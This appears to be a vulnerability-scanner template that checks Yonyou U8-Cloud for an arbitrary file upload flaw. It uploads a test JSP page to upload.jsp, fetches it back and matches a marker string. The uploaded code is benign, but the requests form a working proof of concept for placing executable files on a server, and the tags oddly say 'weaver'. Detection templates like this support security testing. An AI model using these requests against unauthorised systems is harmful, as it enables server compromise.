id: yongyouOA-U8-Cloud-upload-file-upload
info:
  name: 用友U8-Cloud upload任意文件上传漏洞
  author: cnaq
  severity: critical
  description: 用友U8-Cloud upload任意文件上传漏洞
  reference:
    - https://github.com/wy876/POC/blob/main/%E7%94%A8%E5%8F%8BU8-Cloud%20upload%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md
  tags: weaver,rce

requests:
  - raw:
      - |
        POST /linux/pages/upload.jsp HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36
        Connection: close
        Content-Length: 31
        Content-Type: application/x-www-form-urlencoded
        filename: hack3edc.jsp
        Accept-Encoding: gzip

        <% out.println("The website has vulnerabilities!!");%>

      - |
        GET /linux/hack3edc.jsp HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36
        
    matchers-condition: and
    matchers:
      - type: word
        part: header
        words:
          - '200'
      - type: regex
        part: body
        regex:
          - 'The website has vulnerabilities!!'